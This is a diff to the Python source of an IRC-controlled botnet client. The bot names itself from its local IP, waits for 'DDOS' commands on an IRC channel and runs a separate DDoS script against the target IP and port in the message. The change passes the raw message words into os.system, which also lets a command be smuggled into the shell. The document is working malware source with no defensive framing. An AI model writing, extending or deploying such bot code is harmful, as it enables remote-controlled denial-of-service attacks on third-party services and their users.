@@ -17,8 +17,8 @@ nick = "bot-" + "_".join(local_ip.split("."))
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
-def initiate_ddos(method, target_ip, target_port, threads, duration):
-    os.system(f"python3 {DDOS_SCRIPT_PATH} {method} {target_ip}:{target_port} {threads} {duration}")
+def initiate_ddos(args):
+    os.system(f"python3 {DDOS_SCRIPT_PATH} {' '.join(args)}")
 
 
 if __name__ == "__main__":
@@ -37,5 +37,5 @@ if __name__ == "__main__":
             irc.send(f"PONG {nick}\r\n".encode())
 
         if "DDOS" in msg:
-            method, target_ip, target_port, threads, duration = msg.rstrip().split(":DDOS ")[1].split(" ")
-            initiate_ddos(method, target_ip, target_port, threads, duration)
+            args = msg.rstrip().split(":DDOS ")[1].split(" ")
+            initiate_ddos(args)
